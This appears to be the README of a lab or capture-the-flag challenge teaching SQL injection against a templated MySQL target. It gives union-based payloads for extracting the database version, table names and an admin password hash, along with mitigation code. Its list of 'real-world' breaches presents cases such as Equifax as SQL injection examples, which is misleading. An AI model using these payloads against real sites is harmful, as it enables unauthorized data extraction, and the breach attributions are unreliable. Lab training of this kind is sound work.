# SQL Injection Mastery

## 🎯 Challenge Overview
Master SQL injection techniques from basic to advanced, including blind and time-based SQLi. This challenge will test your ability to identify and exploit SQL injection vulnerabilities in a controlled environment.

## 🛠️ Prerequisites
- Basic knowledge of SQL
- Understanding of web applications
- Kali Linux or similar penetration testing environment

## 🎯 Learning Objectives
- Understand different types of SQL injection attacks
- Learn to exploit SQL injection vulnerabilities
- Practice using SQL injection tools
- Understand mitigation techniques

## 🚀 Getting Started

### Target Information
- **Target URL**: http://{{ target_ip }}
- **Vulnerable Parameter**: `id` in the product page
- **Database Type**: MySQL

### Setup Instructions
1. Ensure the vulnerable web application is running
2. Navigate to the product page: `http://{{ target_ip }}/product.php?id=1`

## 🔍 Finding the Vulnerability

### Step 1: Basic Injection Test
Try appending a single quote to the ID parameter:
```sql
http://{{ target_ip }}/product.php?id=1'
```
If the page returns an SQL error, it's likely vulnerable to SQL injection.

### Step 2: Determine Number of Columns
Use `ORDER BY` to find the number of columns:
```sql
http://{{ target_ip }}/product.php?id=1 ORDER BY 1--
http://{{ target_ip }}/product.php?id=1 ORDER BY 2--
...
```

## 💥 Exploitation

### Basic Union-Based Injection
```sql
http://{{ target_ip }}/product.php?id=-1 UNION SELECT 1,2,3,4,5--
```

### Extracting Database Information
```sql
http://{{ target_ip }}/product.php?id=-1 UNION SELECT 1,database(),version(),user(),5--
```

### Dumping Table Information
```sql
http://{{ target_ip }}/product.php?id=-1 UNION SELECT 1,table_name,3,4,5 FROM information_schema.tables WHERE table_schema=database()--
```

## 🎯 Challenge Flags

### Flag 1 (10 points)
Find the version of the database.

### Flag 2 (20 points)
Dump all table names from the current database.

### Flag 3 (30 points)
Retrieve the admin user's password hash.

## 🛡️ Mitigation Techniques

### 1. Use Prepared Statements
```php
$stmt = $pdo->prepare('SELECT * FROM products WHERE id = :id');
$stmt->execute(['id' => $id]);
```

### 2. Input Validation
```php
if (!is_numeric($id)) {
    die('Invalid input');
}
```

### 3. Least Privilege
```sql
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'secure_password';
GRANT SELECT ON db.products TO 'webapp'@'localhost';
```

## 🌐 Real-World Impact

### Potential Consequences
- Unauthorized access to sensitive data
- Database deletion or corruption
- Complete system compromise
- Legal consequences

### Real-World Examples
- **2017 Equifax Breach**: Exposed 147 million records
- **2019 Citrix Breach**: 6TB of sensitive data stolen
- **2020 EasyJet Hack**: 9 million customer records exposed

## 📚 Additional Resources
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger SQL Injection Academy](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Payloads](https://github.com/payloadbox/sql-injection-payload-list)

## 🎓 Learning Path
1. Complete basic SQL injection challenges
2. Practice blind SQL injection
3. Learn about time-based SQL injection
4. Study advanced exploitation techniques
5. Understand and implement mitigations

## 🏆 Tips for Success
- Start with basic injection techniques
- Use Burp Suite for complex injections
- Always test in a controlled environment
- Document your findings
- Understand the underlying SQL queries
